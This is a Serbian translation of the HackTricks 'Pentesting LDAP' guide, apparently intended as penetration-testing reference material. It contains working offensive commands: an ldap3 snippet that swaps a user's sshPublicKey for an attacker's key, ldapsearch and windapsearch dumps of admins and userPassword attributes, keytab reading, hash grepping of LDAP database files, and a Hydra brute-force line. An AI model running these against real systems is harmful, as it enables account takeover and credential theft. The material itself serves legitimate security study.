# 389, 636, 3268, 3269 - Pentesting LDAP

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

Kori코캖enje **LDAP** (Lightweight Directory Access Protocol) je uglavnom za lociranje razli캜itih entiteta kao 코to su organizacije, pojedinci i resursi poput fajlova i ure캠aja unutar mre쬬, kako javnih tako i privatnih. Nudi pojednostavljen pristup u pore캠enju sa svojim prethodnikom, DAP-om, imaju캖i manji kodni otisak.

LDAP direktorijumi su strukturirani da omogu캖e njihovu distribuciju preko nekoliko servera, pri 캜emu svaki server sadr쬴 **replikovanu** i **sinhronizovanu** verziju direktorijuma, nazvanu Directory System Agent (DSA). Odgovornost za obradu zahteva le쬴 isklju캜ivo na LDAP serveru, koji mo쬰 komunicirati sa drugim DSAs po potrebi kako bi dostavio ujedinjen odgovor zahtevaocu.

Organizacija LDAP direktorijuma podse캖a na **hijerarhiju stabla, po캜ev코i od korenskog direktorijuma na vrhu**. Ovo se gran캜i ka zemljama, koje se dalje dele na organizacije, a zatim na organizacione jedinice koje predstavljaju razli캜ite odeljenja ili departmane, kona캜no dosti쬿캖i nivo individualnih entiteta, uklju캜uju캖i i ljude i deljene resurse poput fajlova i 코tampa캜a.

**Podrazumevani portovi:** 389 i 636 (ldaps). Globalni katalog (LDAP u ActiveDirectory-u) je dostupan podrazumevano na portovima 3268 i 3269 za LDAPS.
```
PORT    STATE SERVICE REASON
389/tcp open  ldap    syn-ack
636/tcp open  tcpwrapped
```
### LDAP format za razmenu podataka

LDIF (LDAP Data Interchange Format) defini코e sadr쬬j direktorijuma kao skup zapisa. Tako캠e mo쬰 predstavljati zahteve za a쬿riranje (Dodaj, Izmeni, Obri코i, Preimenuj).
```bash
dn: dc=local
dc: local
objectClass: dcObject

dn: dc=moneycorp,dc=local
dc: moneycorp
objectClass: dcObject
objectClass: organization

dn ou=it,dc=moneycorp,dc=local
objectClass: organizationalUnit
ou: dev

dn: ou=marketing,dc=moneycorp,dc=local
objectClass: organizationalUnit
Ou: sales

dn: cn= ,ou= ,dc=moneycorp,dc=local
objectClass: personalData
cn:
sn:
gn:
uid:
ou:
mail: pepe@hacktricks.xyz
phone: 23627387495
```
* Linije 1-3 defini코u top nivo domena local
* Linije 5-8 defini코u prvi nivo domena moneycorp (moneycorp.local)
* Linije 10-16 defini코u 2 organizacione jedinice: dev i sales
* Linije 18-26 kreiraju objekat domena i dodeljuju atribute sa vrednostima

## Upis podataka

Imajte na umu da ako mo쬰te da menjate vrednosti, mo쬰te izvr코iti zaista interesantne akcije. Na primer, zamislite da **mo쬰te promeniti informacije "sshPublicKey"** va코eg korisnika ili bilo kog korisnika. Veoma je verovatno da ako ovaj atribut postoji, onda **ssh 캜ita javne klju캜eve iz LDAP-a**. Ako mo쬰te da promenite javni klju캜 korisnika, **mo캖i 캖ete da se prijavite kao taj korisnik 캜ak i ako autentikacija lozinkom nije omogu캖ena u ssh-u**.
```bash
# Example from https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
>>> import ldap3
>>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
>>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
>>> connection.bind()
True
>>> connection.extend.standard.who_am_i()
u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
>>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
```
## Snifovanje lozinki u 캜istom tekstu

Ako se LDAP koristi bez SSL-a, mo쬰te **snifovati lozinke u 캜istom tekstu** u mre쬴.

Tako캠e, mo쬰te izvesti **MITM** napad u mre쬴 **izme캠u LDAP servera i klijenta.** Ovde mo쬰te izvesti **Napad na smanjenje nivoa sigurnosti** kako bi klijent koristio **lozinke u 캜istom tekstu** za prijavljivanje.

**Ako se koristi SSL**, mo쬰te poku코ati izvesti **MITM** kao 코to je gore navedeno, ali nude캖i **la쬹i sertifikat**, ako ga **korisnik prihvati**, mo쬰te smanjiti nivo autentifikacije i ponovo videti lozinke.

## Anoniman pristup

### Zaobila쬰nje TLS SNI provere

Prema [**ovom obja코njenju**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) samo pristupanjem LDAP serveru sa proizvoljnim imenom domena (kao 코to je company.com) mogao je da kontaktira LDAP servis i izvu캜e informacije kao anonimni korisnik:
```bash
ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```
### LDAP anonimne veze

[LDAP anonimne veze](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled) omogu캖avaju **neautentifikovanim napada캜ima** da dobiju informacije iz domena, kao 코to su potpuni popis korisnika, grupa, ra캜unara, atributa korisni캜kih naloga i pravila lozinke domena. Ovo je **zastarela konfiguracija**, i od Windows Servera 2003, samo autentifikovanim korisnicima je dozvoljeno da pokre캖u LDAP zahteve.\
Me캠utim, administratori su mo쬯a morali da **podele odre캠enu aplikaciju za dozvolu anonimnih veza** i dali vi코e pristupa nego 코to je bilo planirano, 캜ime su omogu캖ili neautentifikovanim korisnicima pristup svim objektima u AD.

## Validni kredencijali

Ako imate validne kredencijale za prijavljivanje na LDAP server, mo쬰te izlistati sve informacije o Administratoru domena koriste캖i:

[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
```bash
pip3 install ldapdomaindump
ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
```
### [Brute Force](../generic-methodologies-and-resources/brute-force.md#ldap)

## Enumeracija

### Automatizovano

Kori코캖enjem ovoga bi캖ete u mogu캖nosti da vidite **javne informacije** (kao 코to je naziv domena)**:**
```bash
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials
```
### Python

<details>

<summary>Pogledajte enumeraciju LDAP-a pomo캖u Python-a</summary>

Mo쬰te poku코ati **enumerisati LDAP sa ili bez akreditiva kori코캖enjem Python-a**: `pip3 install ldap3`

Prvo poku코ajte da se **pove쬰te bez** akreditiva:
```bash
>>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info
```
Ako je odgovor `True` kao u prethodnom primeru, mo쬰te dobiti neke **interesantne podatke** o LDAP (kao 코to su **naming context** ili **domain name**) servera sa:
```bash
>>> server.info
DSA info (from DSE):
Supported LDAP versions: 3
Naming contexts:
dc=DOMAIN,dc=DOMAIN
```
Kada jednom imate kontekst imenovanja, mo쬰te napraviti neke uzbudljivije upite. Ovaj jednostavan upit treba da vam poka쬰 sve objekte u direktorijumu:
```bash
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
>> connection.entries
```
Ili **ispraznite** ceo ldap:
```bash
>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
True
>>> connection.entries
```
</details>

### windapsearch

[**Windapsearch**](https://github.com/ropnop/windapsearch) je Python skripta korisna za **enumeraciju korisnika, grupa i ra캜unara sa Windows** domena kori코캖enjem LDAP upita.
```bash
# Get computers
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --computers
# Get groups
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --groups
# Get users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Domain Admins
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Privileged Users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --privileged-users
```
### ldapsearch

Proverite nul kredencijale ili da li su va코e kredencijale validne:
```bash
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```bash
# CREDENTIALS NOT VALID RESPONSE
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
tion a successful bind must be completed on the connection., data 0, v3839
```
Ako prona캠ete ne코to 코to ka쬰 da je "_bind mora biti zavr코en_", to zna캜i da su pristupni podaci neta캜ni.

Mo쬰te izvu캖i **sve sa domena** koriste캖i:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
-x Simple Authentication
-H LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
```
Izdvajanje **korisnika**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
#Example: ldapsearch -x -H ldap://<IP> -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"
```
Izvr코ite ekstrakciju **ra캜unara**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Izvr코ite **izvla캜enje mojih informacija**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Izvuci **Domain Admins**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Izvucite **Korisnike domena**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Izvucite **Enterprise Admins**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Izvuci **Administratori**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Izvucite **Remote Desktop Group**:
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
Da biste videli da li imate pristup bilo kojoj lozinci, mo쬰te koristiti grep nakon izvr코avanja jednog od upita:
```bash
<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"
```
#### pbis

**Pbis** mo쬰te preuzeti sa [ovde](https://github.com/BeyondTrust/pbis-open/) i obi캜no se instalira u `/opt/pbis`.\
**Pbis** vam omogu캖ava da lako dobijete osnovne informacije:
```bash
#Read keytab file
./klist -k /etc/krb5.keytab

#Get known domains info
./get-status
./lsa get-status

#Get basic metrics
./get-metrics
./lsa get-metrics

#Get users
./enum-users
./lsa enum-users

#Get groups
./enum-groups
./lsa enum-groups

#Get all kind of objects
./enum-objects
./lsa enum-objects

#Get groups of a user
./list-groups-for-user <username>
./lsa list-groups-for-user <username>
#Get groups of each user
./enum-users | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do ./list-groups-for-user "$name"; echo -e "========================\n"; done

#Get users of a group
./enum-members --by-name "domain admins"
./lsa enum-members --by-name "domain admins"
#Get users of each group
./enum-groups | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do echo "$name"; ./enum-members --by-name "$name"; echo -e "========================\n"; done

#Get description of each user
./adtool -a search-user --name CN="*" --keytab=/etc/krb5.keytab -n <Username> | grep "CN" | while read line; do
echo "$line";
./adtool --keytab=/etc/krb5.keytab -n <username> -a lookup-object --dn="$line" --attr "description";
echo "======================"
done
```
## Grafi캜ki interfejs

### Apache Directory

[**Preuzmite Apache Directory odavde**](https://directory.apache.org/studio/download/download-linux.html). Mo쬰te prona캖i [primer kako koristiti ovaj alat ovde](https://www.youtube.com/watch?v=VofMBg2VLnw\&t=3840s).

### jxplorer

Mo쬰te preuzeti grafi캜ki interfejs sa LDAP serverom ovde: [http://www.jxplorer.org/downloads/users.html](http://www.jxplorer.org/downloads/users.html)

Podrazumevano je instaliran u: _/opt/jxplorer_

![](<../.gitbook/assets/image (482).png>)

### Godap

Mo쬰te pristupiti ovde: [https://github.com/Macmod/godap](https://github.com/Macmod/godap)

## Autentikacija putem kerberosa

Kori코캖enjem `ldapsearch` mo쬰te **autentikovati** putem **kerberosa umesto** putem **NTLM** kori코캖enjem parametra `-Y GSSAPI`

## POST

Ako mo쬰te pristupiti fajlovima gde se baze podataka nalaze (mo쬰 biti u _/var/lib/ldap_). Mo쬰te izvu캖i he코eve kori코캖enjem:
```bash
cat /var/lib/ldap/*.bdb | grep -i -a -E -o "description.*" | sort | uniq -u
```
### Konfiguracioni fajlovi

* Op코te
* containers.ldif
* ldap.cfg
* ldap.conf
* ldap.xml
* ldap-config.xml
* ldap-realm.xml
* slapd.conf
* IBM SecureWay V3 server
* V3.sas.oc
* Microsoft Active Directory server
* msadClassesAttrs.ldif
* Netscape Directory Server 4
* nsslapd.sas\_at.conf
* nsslapd.sas\_oc.conf
* OpenLDAP directory server
* slapd.sas\_at.conf
* slapd.sas\_oc.conf
* Sun ONE Directory Server 5.1
* 75sas.ldif
```
Protocol_Name: LDAP    #Protocol Abbreviation if there is one.
Port_Number:  389,636     #Comma separated if there is more than one.
Protocol_Description: Lightweight Directory Access Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for LDAP
Note: |
The use of LDAP (Lightweight Directory Access Protocol) is mainly for locating various entities such as organizations, individuals, and resources like files and devices within networks, both public and private. It offers a streamlined approach compared to its predecessor, DAP, by having a smaller code footprint.

https://book.hacktricks.xyz/pentesting/pentesting-ldap

Entry_2:
Name: Banner Grab
Description: Grab LDAP Banner
Command: nmap -p 389 --script ldap-search -Pn {IP}

Entry_3:
Name: LdapSearch
Description: Base LdapSearch
Command: ldapsearch -H ldap://{IP} -x

Entry_4:
Name: LdapSearch Naming Context Dump
Description: Attempt to get LDAP Naming Context
Command: ldapsearch -H ldap://{IP} -x -s base namingcontexts

Entry_5:
Name: LdapSearch Big Dump
Description: Need Naming Context to do big dump
Command: ldapsearch -H ldap://{IP} -x -b "{Naming_Context}"

Entry_6:
Name: Hydra Brute Force
Description: Need User
Command: hydra -l {Username} -P {Big_Passwordlist} {IP} ldap2 -V -f
```
<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
